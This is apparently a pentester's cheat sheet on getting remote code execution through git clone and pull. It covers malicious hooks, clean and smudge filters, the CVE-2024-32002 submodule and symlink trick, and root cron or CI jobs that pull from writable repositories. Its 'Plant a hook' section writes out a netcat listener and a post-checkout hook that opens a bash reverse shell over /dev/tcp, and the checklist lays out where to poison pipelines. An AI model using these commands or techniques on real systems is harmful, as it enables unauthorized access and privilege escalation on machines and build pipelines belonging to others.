# Git clone RCE

## What it is
- [ ] Cloning or pulling a repository I control can run its content: hooks, the clean and smudge filters named in .gitattributes, or submodules that point somewhere hostile
- [ ] The CVE-2024-32002 family: a submodule, a symlink and a case-insensitive filesystem write a hook into .git/, which the clone itself then runs, with nothing asked of the user but the clone

## Where it applies
- [ ] Cron or CI that runs git clone or git pull as root on a repository I can write: a hook planted, and :Pb cron for the timer
- [ ] A web application deployed by git pull: its upstream repository poisoned, or its local .git/hooks
- [ ] post-checkout is the reliable hook: it runs after every clone and checkout

## Plant a hook
With write access to the local .git folder, and a listener up on Kali:
rlwrap nc -lvnp <LPORT>
printf '#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\n' > .git/hooks/post-checkout
chmod +x .git/hooks/post-checkout
- [ ] Hooks are not cloned from a remote: this works when I can write the local .git, not when I only control the repository
- [ ] With only the repository: the submodule and symlink trick of CVE-2024-32002, or content the pipeline runs, such as build scripts, Makefiles and a package.json postinstall

## On sight
- [ ] A readable .git on a web root: dumped first, :Pb discovery
- [ ] git pull in root's cron: a hook, or a hostile merge
- [ ] A clone that a user or CI will run: the submodule case collision
